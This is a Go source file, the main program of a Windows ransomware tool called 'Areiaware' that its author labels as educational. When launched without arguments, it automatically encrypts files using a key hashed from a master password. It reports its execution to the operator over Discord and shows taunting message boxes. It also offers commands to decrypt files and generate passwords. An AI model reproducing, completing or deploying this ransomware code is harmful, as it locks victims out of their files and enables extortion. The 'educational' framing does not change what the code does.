package main

import (
    "crypto/sha256"
    "fmt"
    "os"
    "unsafe"

    "golang.org/x/sys/windows"
	atena "main/artefacts" // Se pone de alias para que jale los módulos
)

func main() {

    // Cargamos las configuraciones del json
    err := atena.LoadConfig()
    if err != nil {
        fmt.Println(err)
        os.Exit(1)
    }

    // Inicializar Discord
    err = atena.InitDiscord()
    if err != nil {
        fmt.Printf("  Discord Error: %v\n", err)
        fmt.Println("   Continuing without Discord notifications...")
    }

    err = atena.SendNotificationEmbed(
        "Areiaware was executed",
        "The encryption tool has started successfully.",
        0x00ff00, // Verde 
    )

    if err != nil {
        fmt.Printf("Error in embed notification: %v\n", err)
    }else{
        fmt.Println(" Discord notification sent successfully")
    }

    
    banner() // Mostramos el banner

    // Si no hay argumentos, encriptar automáticamente
    if len(os.Args) < 2 {
        // Generar password de recuperación (VARIABLE LOCAL)
        recoveryPassword := atena.GeneratePasswd() // <-- USAR GeneratePasswd()
        
        // Asignar la recovery password generada a la global del paquete atenea
        atena.SetRecoveryPassword(recoveryPassword) // <-- FUNCIÓN NUEVA

        fmt.Println("\n[!] Your recovery password is:")
        fmt.Printf("    %s\n\n", recoveryPassword)
        
        showWarning()
        
        // Encriptar con la master password (VARIABLE EXPORTADA)
        // Usar atena.MasterPassword y atena.LockFiles()
        key := sha256.Sum256([]byte(atena.MasterPassword)) // <-- USAR atena.MasterPassword
        atena.LockFiles(key[:]) // <-- USAR atena.LockFiles()
        
        showFuckOff()
        help()
        os.Exit(0)
    }

    // Los argumentos que se le pasarán a la herramienta
    comando := os.Args[1]

    switch comando { // Lista de comandos
    case "a":
        about()
    case "u":
        key := atena.GetPsswd()  // <-- USAR atena.GetPsswd()
        atena.Unlock(key) // <-- USAR atena.Unlock()
    case "g":
        fmt.Println(atena.GeneratePasswd()) // <-- USAR atena.GeneratePasswd()
    case "h":
        help()
    default: 
        fmt.Println("Comando no reconocido. Usa -h para ayuda.")
    }
}

//Lo que se va a imprimir en consola
func banner() {
    fmt.Println("╔════════════════════════════╗")
    fmt.Printf("║  Ransomware v%s           ║\n", atena.VERSION) // Printf nos imprime con formato, algo parecido al -e en bash
    fmt.Println("║  Educational Tool          ║")
    fmt.Println("╚════════════════════════════╝")
	fmt.Println("                by: AreiaNight")
}

func help() {
    fmt.Println("\nCommand lines:")
    fmt.Println("- u  > for decrypt the files")
    fmt.Println("- a  > about this project and some background")
	fmt.Println("- g  > genera una contraseña temporal")
	fmt.Println("- h  > show this help\n")
}

func about() {
    fmt.Println("\nThis is an educational project. I created this because as a kid I wanted a bait for possible thiefs or curious persons who wanted to mess with my pc\n and make my computer unreachable. So this is a kind of ransomware based on that idea \nbecause this isn't for malicious propouses but a way for me to learn go and make that idea I had as a little girl true\n") 
}

func showWarning() {
	user32 := windows.NewLazySystemDLL("user32.dll")
	messageBox := user32.NewProc("MessageBoxW")

	text, _ := windows.UTF16PtrFromString("BE CAREFUL, SUCKER!")
	title, _ := windows.UTF16PtrFromString("Warning")

	messageBox.Call(
		0,
		uintptr(unsafe.Pointer(text)),
		uintptr(unsafe.Pointer(title)),
		0x30,
	)
}

func showFuckOff() {
	user32 := windows.NewLazySystemDLL("user32.dll")
	messageBox := user32.NewProc("MessageBoxW")

	text, _ := windows.UTF16PtrFromString("All gone, fuck you!")
	title, _ := windows.UTF16PtrFromString("Warning")

	messageBox.Call(
		0,
		uintptr(unsafe.Pointer(text)),
		uintptr(unsafe.Pointer(title)),
		0x30,
	)
}

